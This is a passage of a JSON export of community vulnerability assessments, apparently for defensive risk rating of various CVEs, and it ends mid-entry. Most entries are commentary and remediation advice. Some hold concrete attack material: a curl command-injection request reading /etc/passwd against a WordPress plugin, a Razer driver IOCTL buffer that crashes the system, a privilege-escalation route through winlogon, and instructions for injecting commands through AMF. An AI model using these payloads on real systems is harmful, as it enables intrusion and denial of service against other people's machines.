      "id": "1ee9ff89-d1bc-4d54-bdaf-89ed53c608fe",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "0a5b2dc4-5eff-454f-940a-e556f9d5e4c3",
      "created": "2019-11-20T15:00:39.847428Z",
      "revisionDate": "2020-02-13T17:11:55.064025Z",
      "document": "Purportedly, this affects versions of rConfig prior to 3.9.2, as well.  rConfig installation leaves files lying around, asking the user to clean them up.  If the user doesn't take this step, then an attacker can use the ajaxServerSettingsChk.php file (leftover from installation) to gain unauthenticated command execution as the web server user.  Chain this with a local privilege escalation, and things can go from bad to worse for the target...\r\n\r\nOne can remediate this by removing all files from the rConfig installation directory.",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "dd520752-463a-4e4f-a64f-6bb876b1b494",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "64175426-ad4c-4f25-bdf0-e43d6b87ae79",
      "created": "2019-11-20T15:15:10.673865Z",
      "revisionDate": "2020-02-13T17:11:54.865497Z",
      "document": "Data Protector is a product of Micro Focus (formerly HPE Software).  Vulnerable versions allow exploit of the trusted $PATH environment variable of the SUID binary `omniresolve`, leading to privilege escalation.  Sounds like versions in the 9.X range have also proved to be vulnerable.\r\n\r\nIt's reported that upgrading to Data Protector v10.50 successfully patches this vulnerability.",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "5eb932da-dab5-4be1-a832-34b2fdc2705a",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "d9546e0e-61ed-41fe-a988-560b9724729e",
      "created": "2019-11-20T15:33:18.968066Z",
      "revisionDate": "2020-02-13T17:11:54.668885Z",
      "document": "Unclear if this has been officially patched yet in Net-SNMPd (there are reports that the most-current version is still vulnerable).\r\n\r\nOne way to remediate would be to set access to READ ONLY instead of READ/WRITE.",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "mitigation-strength": 4,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "dd977c7f-853a-433d-88c9-7c238f70ad76",
      "editorId": "adea3bbf-fef7-40ca-beaa-7e31e791ea61",
      "topicId": "23989659-4c74-427c-a87c-23d8e9835ea8",
      "created": "2019-11-20T18:03:18.747768Z",
      "revisionDate": "2020-02-13T17:11:54.475384Z",
      "document": "Given the video showing how to take advantage of this vulnerability: https://youtu.be/3BQKpPNlTSo, this seems like an really easy way to do privilege escalation. Full blog here: https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 3,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "4625470b-399d-4390-9ff8-2aac16ffc6cb",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "bd6ac16e-e54f-4402-ad33-9f7c44aeda3b",
      "created": "2019-11-20T23:40:01.017636Z",
      "revisionDate": "2020-02-13T17:11:54.280092Z",
      "document": "Have to be on the same local network as the target device to pull this off, but, hey, unauthenticated video broadcasting...!  Might make those doctor waiting room visits a little more interesting...",
      "score": 1,
      "metadata": {
        "stability": 4,
        "reliability": 4,
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 2,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "f30781af-b8cc-4442-961f-404dc3038086",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "08743e54-8d4b-4ffc-95e7-8296c8152910",
      "created": "2019-11-21T18:58:16.633887Z",
      "revisionDate": "2020-02-13T17:11:54.079958Z",
      "document": "Sounds like this vuln appears in a LOT of versions of the software.  Probably should update to v15.1.7+.",
      "score": 2,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "2b6236b4-3190-40fe-9bf3-6e4054321f66",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "1d147668-e542-4997-aed2-31e07b5af229",
      "created": "2019-11-21T23:14:15.185157Z",
      "revisionDate": "2020-02-13T17:11:53.885016Z",
      "document": "# Analysis\r\nThe Razer rzpnk.sys driver exposes a device `\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095` which can be used to open an handle to an arbitrary process from any user. A user needs to open a handle to this device and issue `NtDeviceIoControlFile` using the IOCTL `0x22a050` to trigger the vulnerable code path. The buffer to be passed to the process is the target PID to open and 0 packed as two QWORD values (`buffer = [pid, 0].pack('QQ')`. This ultimately leads to a call to `ZwOpenProcess` which does not perform as many security checks as `NtOpenProcess`, thus allowing a user to open a handle to an arbitrary process.\r\n\r\nTo gain code execution from this vulnerability, the `user32!LockWindowStatoin` function can be hooked within the `winlogon` process. This process and function are ideal targets because `winlogon` runs as `NT_AUTHORITY\\SYSTEM` and the function can be triggered on demand. As a by product of exploiting this, the screen will be locked, which may tip off an observant user who is interacting with the system at the time of exploitation.\r\n\r\nExploitation of this vulnerability is quite reliable as it does not rely on memory corruption.\r\n\r\n# References\r\n* https://warroom.rsmus.com/cve-2017-9769/\r\n* https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/razer_zwopenprocess.rb",
      "score": 3,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "9ff81f8f-d985-4c0a-a05f-dc440efa99b5",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "0cb353bb-7b60-4fbe-9afb-f0850b96a431",
      "created": "2019-11-21T23:16:55.122401Z",
      "revisionDate": "2020-02-13T17:11:53.686141Z",
      "document": "There's some interesting debate around the couching of this as a vuln in PostgreSQL, itself, since the COPY TO/FROM PROGRAM is ostensibly documented to allow program execution.  Certainly a good reminder to, in general, limit privs where possible (in this case, don't grant 'pg_execute_server_program' to users who don't require it).",
      "score": 1,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "04cf277e-0538-421c-b6fb-352c78a2c692",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "46ae5a4f-8bf9-4cf9-bb33-2cb591d7b62d",
      "created": "2019-11-25T15:26:06.203815Z",
      "revisionDate": "2020-09-24T16:42:39.84373Z",
      "document": "Exploit doesn't work within the Chrome sandbox, so an attacker will need to escape that first.  Couple that with the facts that x64 is more difficult to target and the auto-update nature of Chrome, this one wouldn't be the easiest to exploit, methinks...",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "c8eb871b-dea1-44ee-87fb-616439444420",
      "editorId": "8862fae2-43c5-4e0a-8583-3c7ee032cf3e",
      "topicId": "de69576c-6383-43b7-86ca-2655ccb46b8d",
      "created": "2019-11-25T20:02:12.621691Z",
      "revisionDate": "2020-02-13T17:11:53.285438Z",
      "document": "Does rely on a user to download and open an injected .cbt file with a vulnerable version of Evince (though the preview functionality of file manager software might trigger the injection without requiring the user to expressly open the file).",
      "score": 3,
      "metadata": {
        "reliability": 5,
        "attacker-value": 2,
        "exploitability": 3,
        "urgent-to-patch": 3,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "c77c2a59-f031-4ca6-a5a4-c960e99ee72f",
      "editorId": "b68e9cb9-1bd0-4339-abe7-329618ce2467",
      "topicId": "6c13a87d-65a6-4437-b553-6b70238ab737",
      "created": "2019-11-27T14:59:14.734471Z",
      "revisionDate": "2020-02-19T18:39:42.69037Z",
      "document": "This plugin has approximately 1000 active installations and 24,816 downloads according to [Wordpress](https://wordpress.org/plugins/plainview-activity-monitor/advanced/). The vulnerable versions are approximately 25% of the active installations, which is not that much. Also, the attacker needs to be authenticated with a privileged account to make it exploitable, which reduce the likelihood of exploitation. However, the vulnerability is very easy to exploit: a simple HTTP POST request with a specially crafted `ip` parameter:\r\n```bash\r\ncurl -b '<your_session_cookie>;' \\\r\n     -d 'ip=127.0.0.1|cat%20/etc/passwd&lookup=Lookup&submit=Submit%20request' \\\r\n     'http://my_wordpress.com/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools'\r\n```\r\n The root cause is a call to `exec()` with concatenation of unsanitized input (activities_overview.php:357):\r\n```php\r\nexec( 'dig -x ' . $ip, $output );\r\n```",
      "score": 4,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 2,
        "exploitability": 5,
        "used-successfully": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "44be89c9-7467-4b51-aa71-50ecf77555cb",
      "editorId": "3bd9b68f-b354-4552-a291-fc1f92848a33",
      "topicId": "131226a6-a1e9-48a1-a5d0-ac94baf8dfd2",
      "created": "2019-12-02T21:35:14.683751Z",
      "revisionDate": "2020-06-07T20:37:23.046481Z",
      "document": "The effort to execute the exploit out of the box, with default settings on known targets is not that high. It's important to note that to exploit this reliably in atypical scenarios you need to know a bit more detail of the target, including what hypervisor it may be running on.",
      "score": 8,
      "metadata": {
        "stability": 3,
        "reliability": 3,
        "attacker-value": 5,
        "exploitability": 3,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "e7dbb822-8112-413d-a035-f86a87297b8e",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "66a353e1-d685-4f59-9f14-5b981788e874",
      "created": "2019-12-05T17:17:07.418482Z",
      "revisionDate": "2020-02-13T17:11:52.676454Z",
      "document": "This is indeed post-auth SQLi. Users with credentialed access to internal services, such as a disgruntled employee, are potential attackers. The utility of this bug is low.",
      "score": 1,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 2,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "2b5dfc9b-7f7e-4c35-98e4-42c6e7e5a8d4",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "939e24ea-47df-4218-8cad-abd6ca5ea95b",
      "created": "2019-12-05T17:17:17.820402Z",
      "revisionDate": "2020-02-13T17:11:52.485335Z",
      "document": "This is indeed post-auth SQLi. Users with credentialed access to internal services, such as a disgruntled employee, are potential attackers. The utility of this bug is low.",
      "score": 2,
      "metadata": {
        "attacker-value": 1,
        "exploitability": 5,
        "urgent-to-patch": 2,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "6040e9fb-6446-407f-abba-d64cd84de31a",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "87bed4c4-074f-4154-8df7-b5ffd670b137",
      "created": "2019-12-07T14:42:53.565943Z",
      "revisionDate": "2020-02-13T17:11:52.267935Z",
      "document": "The discussion here https://lwn.net/Articles/806546/ shows some of the problems fixing this generally, which really means disabling the weak host model as a mitigation. This is likely perfectly fine for single-ended hosts, which are likely the most vulnerable targets in the first place.",
      "score": 3,
      "metadata": {
        "attacker-value": 2,
        "used-successfully": 1,
        "mitigation-strength": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "7955b85e-f701-4b45-8d19-cd03ff6788f6",
      "editorId": "b11e1f35-dfcc-4edf-8740-9cd5888244e8",
      "topicId": "513e78c5-a9ba-4905-8241-8357fac786ed",
      "created": "2019-12-11T07:11:26.1281Z",
      "revisionDate": "2020-02-24T19:06:19.989581Z",
      "document": "There is a working proof of concept available for some devices.",
      "score": 2,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 3,
        "exploitability": 1,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 3,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "c04879d5-977d-43f5-8774-44a74edd4f46",
      "editorId": "b11e1f35-dfcc-4edf-8740-9cd5888244e8",
      "topicId": "3c96fe41-01ba-4245-8dc3-498bc706f341",
      "created": "2019-12-11T07:13:16.192096Z",
      "revisionDate": "2020-02-24T19:07:05.941545Z",
      "document": "In theory all devices with a security patch level before 2019-03-01 are vulnerable, and this is reachable from within the Chrome sandbox.",
      "score": 2,
      "metadata": {
        "stability": 3,
        "reliability": 2,
        "attacker-value": 3,
        "exploitability": 1,
        "urgent-to-patch": 3,
        "used-successfully": 2,
        "mitigation-strength": 3,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "47b915df-dcff-4e03-9373-0ba588b808ce",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "7d996d56-9b27-4379-8d97-3832a9c3e0e9",
      "created": "2019-12-18T01:17:47.791531Z",
      "revisionDate": "2020-02-13T17:11:51.650688Z",
      "document": "A vulnerability exists within the Razer Synapse driver `rzpnk.sys` in the IOCTL dispatch routine for 0x226048 that can allow an attacker to pass an input buffer which can trigger an out of bounds read operation. A handle can be opened to issue this IOCTL from `\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095`. The result will cause a denial of service condition on the system in the form of a blue screen of death (BSOD).\r\n\r\nThe first four bytes of the buffer are used as the size, first to allocate space and then to read from the source. Since the allocation is of the proper size, an out of bounds write can not be accomplished. If however the specified size is larger than the buffer, then the `memcpy`will continue to read data after the buffer ends.\r\n\r\nBuild the buffer to trigger the exception in Python:\r\n```\r\n# the first 4 bytes are the size then it must be padded to at least 0x220 bytes\r\nbuffer_ = struct.pack('I', 0x70000000) + (b'\\x00' * 0x21c)\r\n```\r\n\r\nProof of Concept code:\r\nhttps://gist.github.com/zeroSteiner/829c313b942f944375b67a6535f01992#file-cve_2017_9770-py",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 5,
        "urgent-to-patch": 2,
        "mitigation-strength": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "ebaf5f5e-84be-47c1-bb3e-f94de463def7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "afc76977-d355-470d-a7f6-fef7a8352b65",
      "created": "2020-01-02T15:42:04.704918Z",
      "revisionDate": "2020-04-17T02:14:06.277794Z",
      "document": "This vulnerability [appears](https://support.citrix.com/article/CTX267679) to be based on a web request to a `/vpns/` resource containing a directory traversal reference. The traversal reference seems to grant access to the admin portal. This specifically is blocked by the `skip_systemaccess_policyeval` flag in the [interim fix](https://support.citrix.com/article/CTX267679) published by Citrix. Based on what information is available publicly, the vulnerability can be exploited to gain code execution on the Citrix server without authentication information. This would be very useful to an attacker because it could be exploited remotely, without authentication and due to the nature of Citrix servers often having a lot of traffic which could facilitate an attacker's efforts to obfuscate their activity.\r\n\r\nIn some environments, Cirtix servers may not be patched as frequently as other systems due to their mission critical nature of providing applications for external users. In this case, attackers may have an easier time in escalating their privileges once code execution has been obtained. This would only be necessary if the initial vector did not already yield `NT_AUTHORITY\\SYSTEM` privileges which the current information does not specify.",
      "score": 5,
      "metadata": {
        "stability": 4,
        "reliability": 3,
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "c5b0eb81-7230-4c4d-b7ba-c799d08d1290",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "3b8f1d17-86bd-46b6-8be7-7c46da686719",
      "created": "2020-01-10T22:05:44.95042Z",
      "revisionDate": "2020-02-13T17:11:51.244327Z",
      "document": "The SQL injection vulnerability is boolean-based blind. Exploitation is relatively simple but the attacker needs to be able to authenticate to Wordpress and possess the privileges to create a new post to attach the vulnerable widget.",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "463cf8b3-97b8-47e6-bb10-e601da660f07",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "9acca2e7-b4d7-4a32-b4c2-32a9ba5e64a0",
      "created": "2020-01-10T22:32:52.608067Z",
      "revisionDate": "2020-02-13T17:11:51.041686Z",
      "document": "The FirebirdSQL server is vulnerable to a stack buffer overflow that can be triggered when an unauthenticated user sends a specially crafted packet. The result can lead to remote code execution as the user which runs the FirebirdSQL server.\r\n\r\nA lack of ASLR in some modules makes exploiting this vulnerability easier as memory locations do not need to be leaked. If the service crashes, it will automatically be restarted in the default configuration.",
      "score": 1,
      "metadata": {
        "stability": 3,
        "reliability": 4,
        "attacker-value": 3,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "b5577d0c-62da-483a-a65b-a4de3e51d268",
      "editorId": "4279447e-31e4-49c4-9efc-c7607f30296b",
      "topicId": "afc76977-d355-470d-a7f6-fef7a8352b65",
      "created": "2020-01-11T19:23:51.380617Z",
      "revisionDate": "2020-02-22T03:11:45.364321Z",
      "document": "There are now public exploits for this and it is now reliable and low-risk to exploit. More info at https://www.reddit.com/r/blueteamsec/comments/en4m7j/multiple_exploits_for_cve201919781_citrix which is a pretty reasonable approximation for how this AKB entry would ideally look :) Also of note, https://twitter.com/buffaloverflow/status/1216807963974938624 mentions a number of files of interest to an attacker.",
      "score": 2,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "c69b6dd7-8fb9-44df-bc8c-b2c8217dc354",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "c4da1146-087c-48e8-b977-c6735f128f8f",
      "created": "2020-01-13T17:56:53.931234Z",
      "revisionDate": "2020-02-13T17:11:50.644093Z",
      "document": "The request to /gateway.php references a vulnerable function `LSRoom_Remoting.doCommand` within the encoded AMF data.  The original parameter for the vulnerable function is \"pref -l /var/system/upgrade/status\"  Replace this part with the command to be executed. Authentication to the web application is not necessary however a valid PHP session ID must be passed within the request.",
      "score": 1,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 2,
        "exploitability": 5,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "98dca579-1a1d-4360-bc71-bdee293407db",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-14T20:20:32.458639Z",
      "revisionDate": "2020-02-13T17:11:50.450178Z",
      "document": "This is a vuln in the way crypt32.dll on recent builds of Windows validates ECC certificates. Yes, it's bad for cryptography. But, an attacker has to be in a position already to get you to either a) run an exe they give you (and then pass the cert check for a trusted publisher), or b) MITM your HTTPS connection (somehow) so their fake website looks like the real website. So... this kinda bugs me that it's being called \"RCE.\" It's not in any useful sense of the term. It's an identity spoofing bug.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "b17b7b65-7e2e-43aa-a537-18ae38fa2c52",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-14T20:26:58.797362Z",
      "revisionDate": "2020-12-28T23:25:49.800128Z",
      "document": "I'm not so sure that @todb-r7's assessment is completely correct, this affects all the things that validate certs, including TLS in browsers, powershell, etc. So kinda impactful beyond just local code execution, this could be a vector for all kinds of other spoofing. \r\n\r\nMore info in swiftonsecurity's thread regarding how this pivots into RCE: https://threadreaderapp.com/thread/1217159419533893633.html\r\n\r\nThe method that should be affected here is https://docs.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-certgetcertificatechain courtesy of https://twitter.com/hackerfantastic/status/1217211301375696896\r\n\r\nOpen source software that uses or exposes this method: https://codesearch.debian.net/search?q=CertGetCertificateChain&literal=1\r\n\r\nThe exposure of user-defined eliptical curves in TLS certificates created a window of opportunity for this bug to appear, which may have been mitigated if the underlying specification was simpler as well, especially with regards to seldom-used features like this. One may want to look ahead to similar bugs in other dark corners of a TLS implementation near you!",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 5,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "24d37642-8e08-4d9f-aa81-4c3f5239777d",
      "editorId": "7dcb2bba-0893-4a4b-a2c9-152965f852b9",
      "topicId": "2be026d9-8bbe-4ac7-a176-a931f6b45750",
      "created": "2020-01-14T20:46:42.810219Z",
      "revisionDate": "2020-02-24T19:03:43.387734Z",
      "document": "First, note that this vuln is in RDP Gateway, not RDP Server, and those are different things. RDGateway is less common than plain ol' RDP Server, but my guess is that it is designed to be deployed right smack on the internet, where we tend to advise people against deploying RDP Server on the internet (people do anyway, but thats-none-of-my-business.jpg).\r\n\r\nAnyway, because it's RD Gateway, the maintainers of such servers probably are already aware that they need to keep up on their patches in the same way a typical IIS administrator does, so I'm not super worried about this bug -- but it all depends on timely patches. Getting root on an RD Gateway server would be super useful for all sorts of internet crime, and this is an ideal sort of vulnerability for just that -- pre-auth, on first connection.\r\n",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5
      },
      "tags": []
    },
    {
      "id": "e0ae5c06-719a-467b-878b-e95cda1bd855",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-15T00:29:08.39756Z",
      "revisionDate": "2020-02-13T17:11:49.706035Z",
      "document": "https://twitter.com/taviso/status/1217146026923978752\r\n\r\nX.509 validation being broken is pretty big. I don't know about RCE possibilities yet, but MITM and spoofing got a whole lot more serious.",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "a16da740-3b25-4bb5-a111-3d1da195ef75",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "f511d0a6-305f-4cac-9339-e098c80030b7",
      "created": "2020-01-15T02:29:08.922325Z",
      "revisionDate": "2020-02-13T17:11:49.505752Z",
      "document": "This is a client-side exploit, which would require spoofing an existing server. If an exploit surfaced, this might be useful for targeting admins, or even other attackers. Would make an interesting addition to a 'hack back' honeypot.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2,
        "used-successfully": 1,
        "confidence-in-ratings": 3
      },
      "tags": []
    },
    {
      "id": "620e1cf5-c864-442a-a248-7dccfe24a523",
      "editorId": "d750dd2d-d52c-4e20-ac81-3f2046de7cc7",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-15T19:16:39.782466Z",
      "revisionDate": "2020-02-27T16:55:11.084901Z",
      "document": "Granted patching is not immediate and still lags in many orgs, but the trend for patching current systems (which is seems to apply to) is better than legacy and there is a working patch, thus I can't see exploits working for long on major, mature organizations. ",
      "score": 2,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "mitigation-strength": 5,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "51294cf8-8c8c-4b8b-9531-a88bbb576082",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "fb9cf676-3d3a-48b6-837e-6057cf88a4a5",
      "created": "2020-01-16T00:01:27.631402Z",
      "revisionDate": "2020-02-13T17:11:49.053111Z",
      "document": "If Serpico is used to provide reports on pentesting results, this could be a problem for customers as there would be plenty of sensitive data that an attacker could use to leverage as a free pass into customer environments (assuming they had not been remediated).",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "d5838b68-6ba0-4078-9deb-1ad097c35be3",
      "editorId": "71b6164f-015d-49ad-bff4-b54bfd579996",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-16T00:31:03.980384Z",
      "revisionDate": "2020-10-24T23:10:19.969578Z",
      "document": "As others have said, this would likely require either MiTM or otherwise coaxing someone to run an executable in a typical malware distribution scenario for the authenticode bit. So, if defining exploitation as successful compromise of a user connection or system, I think the complexity of this is high, but the payoff/utility especially for snooping is fairly critical.\r\n\r\nAgreed on the RCE vector, but I do have a problem with the \"RCE\" label since it tends to imply a certain specific type of code execution, rather than the enablement of a vector of execution, which this is.",
      "score": 4,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 2,
        "urgent-to-patch": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "5b819584-16b4-40c3-aebb-895deb3057bc",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "930683a6-e824-440e-93e1-010cd35314b6",
      "created": "2020-01-21T15:19:45.360301Z",
      "revisionDate": "2020-02-13T17:11:48.66128Z",
      "document": "This looks just as useful as CVE-2015-3884 for deploying a web shell, and easy to check for exploitability. I'm not sure if this is authenticated though, so it's unclear if this is useful without some level of additional access. The CVSS score indicates that it does not require additional privileges, so I guess not?\r\n\r\nI didn't find any of these at first glance sitting on the bare internet with Shodan.",
      "score": 1,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5,
        "used-successfully": 1,
        "mitigation-strength": 3,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "e6380a77-60c2-44ce-befb-c79e50ead3cc",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "e9020f73-4fa8-4bf0-96c6-5a80cf387c14",
      "created": "2020-01-21T15:47:54.689436Z",
      "revisionDate": "2023-08-30T00:49:26.133495Z",
      "document": "Based on other WebLogic vulnerabilities and the rich ecosystem of offensive tools against it, I have a good idea this will be useful without doing a whole lot of specific research. Mitigation strength is place at medium simply because WebLogic is a rich target, and extra care will need to be made by the user to ensure that awareness of future vulnerabilities and health of an installation is closely monitored.",
      "score": 3,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 3,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "eba61759-ba0e-4c29-8c23-8f41b273ed8f",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "85a68a9c-871e-4e2c-a97d-15a2f1ff6a11",
      "created": "2020-01-23T03:26:54.867551Z",
      "revisionDate": "2020-04-15T18:13:29.068608Z",
